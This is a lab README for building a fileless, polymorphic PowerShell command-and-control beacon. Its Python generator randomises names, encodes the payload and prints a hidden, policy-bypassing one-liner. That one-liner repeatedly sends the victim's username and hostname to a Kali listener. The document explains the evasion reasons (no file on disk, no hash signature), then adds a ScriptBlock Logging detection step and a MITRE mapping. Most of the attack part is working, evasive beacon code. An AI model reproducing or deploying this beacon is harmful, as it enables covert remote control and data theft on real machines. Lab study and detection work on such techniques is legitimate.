#  Project 4 – Fileless Polymorphic Malware

##  Goal  
Create a **fileless**, **polymorphic** PowerShell beacon that:
- Runs **only in memory** (no `.ps1` file on disk)
- Changes its **variable names, function names** every time
- Sends beacons to Kali every 30 seconds (Low & Slow)

**Detection:** PowerShell ScriptBlock Logging (Event ID 4104).

---

##  Why This Matters

| Feature | Why Attackers Use It |
| :--- | :--- |
| **Fileless** | No file on disk → AV misses it |
| **Polymorphic** | Every execution is different → no hash signature |
| **PowerShell only** | Living off the land → no custom binary |
| **Low & Slow** | 1 beacon every 30 sec → blends with normal traffic |

---

##  Tools Used

| Tool | Purpose |
| :--- | :--- |
| **Python** | Polymorphic payload generator |
| **PowerShell** | Execute fileless beacon |
| **Kali `socat`** | C2 listener |
| **Windows Event Log** | Detection (Event ID 4104) |

---

##  Step‑by‑Step

### 1️⃣ Enable PowerShell ScriptBlock Logging (Windows Admin)

```powershell
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
```

### 2️⃣ Polymorphic Generator (Python)

Save as `polymorphic_gen.py` and run:

```python
import random, string, base64

def random_var():
    return "$" + ''.join(random.choices(string.ascii_lowercase, k=8))

def random_func():
    return ''.join(random.choices(string.ascii_letters, k=10))

def generate_payload(kali_ip):
    var_url = random_var()
    var_beacon = random_var()
    func_name = random_func()
    
    payload = f'''
function {func_name} {{
    param($url)
    try {{
        $null = Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 5
    }} catch {{}}
}}

{var_url} = "http://{kali_ip}:8080/beacon?user=$env:USERNAME&host=$env:COMPUTERNAME"
{var_beacon} = 30

while($true) {{
    {func_name} -url {var_url}
    Start-Sleep -Seconds {var_beacon}
}}
'''
    return payload

if __name__ == "__main__":
    kali_ip = input("Kali IP: ")
    script = generate_payload(kali_ip)
    encoded = base64.b64encode(script.encode('utf-16le')).decode('ascii')
    one_liner = f'powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded}'
    print("\n" + "="*60)
    print("COPY THIS ONE-LINER TO WINDOWS PowerShell:")
    print("="*60)
    print(one_liner)
```

### 3️⃣ Kali – Start persistent listener

```bash
socat TCP-LISTEN:8080,fork,reuseaddr STDOUT
```

### 4️⃣ Windows – Execute fileless beacon

Copy the **one‑liner** from the Python script and paste into **PowerShell**.

✅ No file created on disk.

### 5️⃣ Detection – PowerShell Event Log (Event ID 4104)

```powershell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} | Where-Object {$_.Message -like "*Invoke-WebRequest*"} | Format-List TimeCreated, Message
```

**Expected output:** Script block text containing `Invoke-WebRequest`.

---

##  Evidence

- Kali `socat` terminal showing periodic beacons  
- PowerShell loop output (`Beacon sent at ...`)  
- Event ID 4104 with `Invoke-WebRequest`  
- No `.ps1` file on disk  

---

## 📈 MITRE ATT&CK Mapping

| Tactic | ID | Technique |
| :--- | :--- | :--- |
| Execution | TA0002 | T1059.001 – PowerShell |
| Command & Control | TA0011 | T1071.001 – Web Protocols |
| Defence Evasion | TA0005 | T1027 – Obfuscated Files or Info |

---

## 👤 Author

**Turhan Acar**  
[GitHub](https://github.com/btncwn) 

---

## 📜 License

**Educational Use Only** – do not deploy on production systems without permission.

---
